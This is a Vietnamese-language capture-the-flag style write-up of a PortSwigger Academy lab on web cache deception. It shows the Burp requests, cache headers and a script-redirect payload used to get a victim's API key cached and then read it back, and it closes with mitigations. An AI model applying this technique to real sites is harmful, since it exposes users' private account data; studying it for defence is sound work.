---
title: "Web Cache Deception: Khai thác Path Mapping Discrepancies"
date: 2026-03-10
tags:
  - web-cache-deception
  - portswigger
  - burp-suite
  - owasp
categories:
  - Web Security
  - writeups
draft: false
---

## Giới thiệu

Đây là bài lab đầu tiên trong series **Web Cache Deception** trên PortSwigger Web Security Academy. Lab này khai thác sự khác biệt (discrepancy) trong cách **origin server** và **cache** xử lý URL path, từ đó đánh cắp dữ liệu nhạy cảm của người dùng khác.

**Lab:** Using path mapping discrepancies  
**Difficulty:** Practitioner  
**Mục tiêu:** Tìm API key của user `carlos`

## Kiến thức nền tảng

### URL Path Mapping là gì?

URL path mapping là quá trình server ánh xạ một URL path tới resource tương ứng. Có 2 kiểu phổ biến:

**Traditional URL mapping** — path tương ứng trực tiếp với file trên hệ thống:

```
http://example.com/path/in/filesystem/resource.html
```

**REST-style URL mapping** — path được trừu tượng hóa thành các endpoint logic:

```
http://example.com/path/resource/param1/param2
```

Ở kiểu REST-style, `param1` và `param2` không phải là file thật, mà là tham số được server xử lý.

### Lỗ hổng nằm ở đâu?

Khi origin server dùng REST-style nhưng cache dùng traditional mapping, sẽ xảy ra discrepancy. Ví dụ với URL:

```
http://example.com/user/123/profile/wcd.css
```

- **Origin server (REST-style):** Route tới endpoint `/user/123/profile`, bỏ qua `wcd.css` → trả về data nhạy cảm
- **Cache (Traditional):** Thấy file `.css` → cache response lại như file tĩnh

Kết quả: data nhạy cảm bị cache và bất kỳ ai truy cập cùng URL đều nhận được.

## Quá trình giải lab

### Bước 1: Xác định target endpoint

Đăng nhập với tài khoản `wiener:peter`, truy cập trang **My Account**. Trang này hiển thị API key — đây chính là dữ liệu nhạy cảm cần bảo vệ.

Trong **Burp Suite**, vào **Proxy > HTTP history**, tìm request `GET /my-account` rồi **Send to Repeater**.

### Bước 2: Test path mapping trên origin server

Trong Repeater, thêm một arbitrary segment vào path:

```
GET /my-account/abc HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=...
```

**Kết quả:** Response `200 OK`, vẫn trả về trang My Account với API key.

→ Origin server dùng REST-style mapping, bỏ qua segment `/abc`.

### Bước 3: Test cache behavior

Thêm static extension `.js` vào path:

```
GET /my-account/abc.js HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=...
```

**Kết quả lần gửi đầu tiên:**

```
HTTP/2 200 OK
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

- `X-Cache: miss` → Response chưa được cache
- `Cache-Control: max-age=30` → Nếu được cache, sẽ lưu trong 30 giây

**Gửi lại trong vòng 30 giây:**

```
HTTP/2 200 OK
Cache-Control: max-age=30
Age: 8
X-Cache: hit
```

- `X-Cache: hit` → Response đã được phục vụ từ cache

→ Cache nhận diện `.js` là file tĩnh và lưu lại toàn bộ response, bao gồm cả data nhạy cảm.

![](static/images/web-cache-3.png)
### Bước 4: Craft exploit

Vào **Exploit Server**, đặt payload trong phần Body:

```html
<script>document.location="https://LAB-ID.web-security-academy.net/my-account/xyz.js"</script>
```

Lưu ý dùng path segment mới (`xyz.js`) để tránh nhận response đã cache từ bước test trước.

Nhấn **Deliver exploit to victim** — khi carlos truy cập, response chứa API key của carlos sẽ bị cache lại.

Ngay lập tức (trong vòng 30 giây), truy cập URL trên browser:

```
https://LAB-ID.web-security-academy.net/my-account/xyz.js
```

Cache trả về response chứa **API key của carlos**. Copy API key và submit solution.
![](static/images/web-cache-1.png)
![](static/images/web-cache-2.png)
## Tổng kết

### Attack flow

```
Attacker                    Victim (carlos)              Server + Cache
   |                              |                           |
   |--- Gửi URL độc hại -------->|                           |
   |                              |--- GET /my-account/xyz.js -->|
   |                              |<-- 200 OK (API key carlos) --|
   |                              |         Cache lưu response   |
   |--- GET /my-account/xyz.js --------------------------------->|
   |<-- 200 OK (API key carlos từ cache) ------------------------|
```

### Root cause

Sự khác biệt (discrepancy) giữa cách origin server và cache xử lý URL path:
- Origin server bỏ qua path segment thừa (REST-style)
- Cache dựa vào file extension để quyết định cache hay không (Traditional)

### Cách phòng chống

- **Cấu hình cache:** Không cache response chỉ dựa trên file extension. Kiểm tra `Content-Type` header trước khi lưu cache
- **Origin server:** Trả về `404` cho path không hợp lệ thay vì bỏ qua segment thừa
- **Response headers:** Thêm `Cache-Control: no-store, private` cho các endpoint chứa dữ liệu nhạy cảm
- **Cache key:** Cấu hình cache key dựa trên cả path lẫn `Content-Type` response

## Công cụ sử dụng

- **Burp Suite Community Edition** — Proxy, Repeater để phân tích request/response
- **Burp's built-in browser** — Truy cập lab qua proxy
